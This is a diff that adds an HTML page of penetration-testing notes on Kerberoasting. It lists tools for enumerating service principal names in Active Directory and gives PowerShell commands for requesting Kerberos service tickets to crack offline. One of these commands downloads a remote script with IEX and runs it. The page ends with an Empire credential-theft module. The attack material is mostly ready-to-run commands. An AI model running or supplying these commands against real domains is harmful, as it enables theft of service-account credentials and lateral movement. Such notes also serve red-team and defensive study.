@@ -1,0 +1,30 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Listing SPNs</title>
+</head><body><b>Listing SPNs</b><br/>
+Ton of ways to do this (lots of scripts and so on)<br/>
+	Use the built in SetSPN.exe built into Windows <br/>
+	<a href="https://github.com/nullbind/Powershellery/tree/master/Stable-ish/Get-SPN">Get-SPN.ps1</a>posted in NetSPI blog @_nullbind / Scott Sutherland<br/>
+	PowerShell <a href="https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/situational_awareness/network/get_spn.py">Empire port</a>of the above (NetSPI blog)<br/>
+	<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs">GetUserSPNs</a>VB Script by Tim Medin<br/>
+	<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1">GetUserSPNs</a>PowerShell script<br/>
+	<a href="https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py">GetUserSPN.py</a>by Impacket. Execute without the advantage of Windows tokens, so you need creds, but not loading anything on disk or executing cmd or powershell<ul><li style="list-style-type: none"><a href="https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts">Find-PSServiceAccounts</a>by adsecurity discovers all user accounts configured with a SPN in the AD domain or forest</li>
+</ul>
+<br/>
+Powershell Requesting<br/>
+One specific ticket:<br/>
+	Add-Type -AssemblyName System.IdentityModel<br/>
+	New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;HTTP/web01.medin.local&quot;<br/>
+<br/>
+All Tickets<br/>
+	Add-Type -AssemblyName System.IdentityModel<br/>
+	setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestor SecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }<br/>
+<br/>
+Just Users<br/>
+	Add-Type -AssemblyName System.IdentityModel<br/>
+	IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1&quot;) | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}<br/>
+<br/>
+Empire<br/>
+usemodule credentials/get_spn_tickets<br/>
+run</body></html>
